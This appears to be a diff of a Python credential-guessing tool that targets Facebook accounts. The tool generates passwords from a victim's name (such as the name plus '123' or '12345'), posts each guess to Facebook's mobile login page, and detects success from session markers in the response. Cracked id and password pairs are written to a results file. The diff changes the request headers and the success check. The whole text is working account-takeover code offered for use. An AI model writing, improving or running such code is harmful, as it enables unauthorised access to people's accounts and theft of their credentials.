@@ -24,9 +24,8 @@ class AutoB:
 		lid=[name+'123',name+'12345',name.lower()+'123',name.lower()+'12345',self.spas]
 		for x in lid:
 			data={'email':idd,'pass':x}
-			head={'User-Agent':'Mozilla/5.0 (Linux; Android 6.0; Redmi 4X Build/MMB29M; xx-xx) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36'}
-			re=requests.post('https://mbasic.facebook.com/login',data=data,headers=head).text
-			if 'save-device' in re or 'mbasic_logout_button' in re:
+			re=requests.post('https://mbasic.facebook.com/login',data=data).text
+			if 'save-device' in re or 'm_sess' in re:
 				pen=open('result/found.txt','a')
 				pen.write(f'{idd}|{x}\n')
 				self.fnd.append('ntaps')
